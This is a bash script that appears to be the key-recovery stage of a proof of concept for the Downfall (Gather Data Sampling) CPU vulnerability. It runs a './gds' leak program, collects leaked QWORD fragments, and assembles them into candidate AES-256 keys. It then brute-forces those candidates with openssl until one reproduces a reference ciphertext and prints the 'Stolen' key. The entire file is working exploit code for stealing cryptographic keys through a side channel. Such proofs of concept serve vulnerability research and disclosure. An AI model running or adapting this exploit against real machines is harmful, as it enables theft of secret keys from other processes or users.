i=3
arrA=()
for line in $(timeout -s2 10s taskset -c 5 ./gds 0); do
    if [ $(expr $i % 4) == 0 ]; then
        arrA[${#arrA[@]}]=$line
        echo $line
    fi
    i=$((i + 1))
done
echo "1st and 3rd QWORD Candidates: ${#arrA[@]}"

i=3
arrB=()
for line in $(timeout -s2 10s taskset -c 5 ./gds 1); do
    if [ $(expr $i % 4) == 0 ]; then
        arrB[${#arrB[@]}]=$line
        echo $line
    fi
    i=$((i + 1))
done
echo "2nd and 4th QWORD Candidates: ${#arrB[@]}"

arrC=()
for line1 in "${arrA[@]}"; do
    for line2 in "${arrB[@]}"; do
        for line3 in "${arrA[@]}"; do
            for line4 in "${arrB[@]}"; do
                arrC[${#arrC[@]}]=$line1$line2$line3$line4
            done
        done
    done
done

echo "Candidates: ${#arrA[@]}^2 x ${#arrB[@]}^2 = ${#arrC[@]}"
i=1
for line1 in "${arrC[@]}"; do
    echo $i $line1
    stolen=$(echo $line1 | tr '[:lower:]' '[:upper:]')
    openssl aes-256-cbc -salt -e -in /tmp/downfall.txt -out /tmp/downfall.txt.encrypted2 -K $stolen -iv 11111111111111111111111111111111
    found=`diff /tmp/downfall.txt.encrypted /tmp/downfall.txt.encrypted2 | wc -l`
    if [ "$found" = "0" ]; then
        echo "Stolen: $stolen"
        exit
    fi
    i=$((i + 1))
done
